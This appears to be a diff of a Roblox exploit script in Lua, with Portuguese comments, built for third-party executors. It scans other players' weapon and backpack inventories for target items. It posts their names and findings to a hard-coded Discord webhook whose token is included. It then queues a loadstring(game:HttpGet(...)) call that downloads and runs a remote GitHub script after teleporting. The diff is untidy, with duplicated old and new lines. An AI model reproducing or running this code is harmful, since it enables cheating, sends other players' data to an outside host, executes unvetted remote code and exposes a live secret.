@@ -1,112 +1,159 @@
 -- SCANNER COM TRAVA DE CARREGAMENTO
--- SCANNER COM TRAVA DE CARREGAMENTO E EMBED
+
 local Players = game:GetService("Players")
+
 local HttpService = game:GetService("HttpService")
+
 local TeleportService = game:GetService("TeleportService")
 
+
+
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1514031008654295040/efj6sTrpu2HRERFEALNMWpgsCAT0b_7V_S4oFrwclE9rkcfQ8si3EfSpaZ3rNTTnAzVq"
+
 local HUB_PLACE_ID = 15327728308
 
+
+
 local ITENS_ALVO = {"barret50", "renellim4", "m79", "backpacktier4",}
-local ITENS_ALVO = {"barret50", "renellim4", "m79", "backpacktier4"}
+
+
 
 -- TRAVA 1: Só continua se o jogo já estiver totalmente carregado na sua tela
+
 if not game:IsLoaded() then
-game.Loaded:Wait()
+
+    game.Loaded:Wait()
+
 end
+
+
 
 local function sendToDiscord(msg)
-local function sendEmbedToDiscord(embedData)
-local req = syn and syn.request or http_request or request
-if req then
-pcall(function()
-req({
-Url = WEBHOOK_URL,
-Method = "POST",
-Headers = {["Content-Type"] = "application/json"},
+
+    local req = syn and syn.request or http_request or request
+
+    if req then
+
+        pcall(function()
+
+            req({
+
+                Url = WEBHOOK_URL,
+
+                Method = "POST",
+
+                Headers = {["Content-Type"] = "application/json"},
+
                 Body = HttpService:JSONEncode({content = msg})
-                Body = HttpService:JSONEncode({embeds = {embedData}})
-})
-end)
+
+            })
+
+        end)
+
+    end
+
 end
-end
+
+
 
 -- AVISA QUE O SCANNER INICIOU
+
 sendToDiscord("📢 SCANNER INICIADO no servidor: " .. game.PlaceId .. " | Aguardando inventários...")
 
+
+
 -- TRAVA 2: Espera 8 segundos para dar tempo do Roblox baixar os inventários dos outros jogadores
--- Espera 8 segundos para dar tempo do Roblox baixar os inventários
+
 task.wait(8)
 
+
+
 local found = {}
-local fields = {}
-local foundCount = 0
+
+
 
 for _, player in ipairs(Players:GetPlayers()) do
-if player == Players.LocalPlayer then continue end
-   
-    -- TRAVA 3: Espera até 3 segundos para ver se a pasta de armas do cara aparece
-    
-local inv = player:WaitForChild("GunInventory", 3)
-if inv then
-for _, obj in ipairs(inv:GetChildren()) do
-@@ -47,8 +43,12 @@ for _, player in ipairs(Players:GetPlayers()) do
-for _, alvo in ipairs(ITENS_ALVO) do
-if nome and nome:lower():find(alvo:lower()) then
-local mag = obj:FindFirstChild("BulletsInMagazine") and obj.BulletsInMagazine.Value or 0
-                        table.insert(found, string.format("%s | %s | %d balas", player.Name, nome, mag))
-                        sendToDiscord("🔫 ENCONTRADO: " .. player.Name .. " | " .. nome)
-                        table.insert(fields, {
-                            name = "🔫 " .. player.Name,
-                            value = nome .. " (" .. mag .. " balas)",
-                            inline = true
-                        })
-                        foundCount += 1
-end
-end
-end
-@@ -57,21 +57,37 @@ for _, player in ipairs(Players:GetPlayers()) do
 
-local bp = player:GetAttribute("EquipmentBackpack")
-if bp and tostring(bp):lower():find("backpacktier4") then
+    if player == Players.LocalPlayer then continue end
+
+   
+
+    -- TRAVA 3: Espera até 3 segundos para ver se a pasta de armas do cara aparece
+
+    local inv = player:WaitForChild("GunInventory", 3)
+
+    if inv then
+
+        for _, obj in ipairs(inv:GetChildren()) do
+
+            if obj:IsA("ObjectValue") and obj.Value then
+
+                local nome = obj.Value.Name
+
+                for _, alvo in ipairs(ITENS_ALVO) do
+
+                    if nome and nome:lower():find(alvo:lower()) then
+
+                        local mag = obj:FindFirstChild("BulletsInMagazine") and obj.BulletsInMagazine.Value or 0
+
+                        table.insert(found, string.format("%s | %s | %d balas", player.Name, nome, mag))
+
+                        sendToDiscord("🔫 ENCONTRADO: " .. player.Name .. " | " .. nome)
+
+                    end
+
+                end
+
+            end
+
+        end
+
+    end
+
+    
+
+    local bp = player:GetAttribute("EquipmentBackpack")
+
+    if bp and tostring(bp):lower():find("backpacktier4") then
+
         table.insert(found, string.format("%s | BackpackTier4 | N/A", player.Name))
+
         sendToDiscord("🎒 BACKPACK: " .. player.Name)
-        table.insert(fields, {
-            name = "🎒 " .. player.Name,
-            value = "BackpackTier4",
-            inline = true
-        })
-        foundCount += 1
+
+    end
+
 end
-end
+
+
 
 if #found > 0 then
-    sendToDiscord("⚠️ TOTAL: " .. #found .. " item(ns) encontrados")
--- Montando a Embed final
-local embed = {
-    title = "📊 Relatório do Scanner",
-    description = "",
-    color = 0,
-    fields = fields,
-    footer = {text = "JobId: " .. game.JobId}
-}
 
-if foundCount > 0 then
-    embed.color = 16711680 -- Vermelho
-    embed.description = "⚠️ **" .. foundCount .. " item(ns) encontrados neste servidor!**"
+    sendToDiscord("⚠️ TOTAL: " .. #found .. " item(ns) encontrados")
+
 else
+
     sendToDiscord("✅ Nada encontrado")
-    embed.color = 65280 -- Verde
-    embed.description = "✅ **Nada de interessante encontrado.**"
+
 end
 
+
+
 sendToDiscord("🔄 Voltando para o hub em 3 segundos...")
--- Envia a Embed consolidada de uma vez só
-sendEmbedToDiscord(embed)
 
 task.wait(3)
 
+
+
 -- FILA O HUB PARA EXECUTAR APÓS O TELEPORTE
+
 local qt = queue_on_teleport or queueteleport or (syn and syn.queue_on_teleport)
+
 if qt then
-qt([[loadstring(game:HttpGet("https://raw.githubusercontent.com/cajiwghdtyasdnhatfy/Acaswartqaawr/refs/heads/main/Hub"))()]])
+
+    qt([[loadstring(game:HttpGet("https://raw.githubusercontent.com/cajiwghdtyasdnhatfy/Acaswartqaawr/refs/heads/main/Hub"))()]])
+
+end
+
+
+
+TeleportService:Teleport(HUB_PLACE_ID)
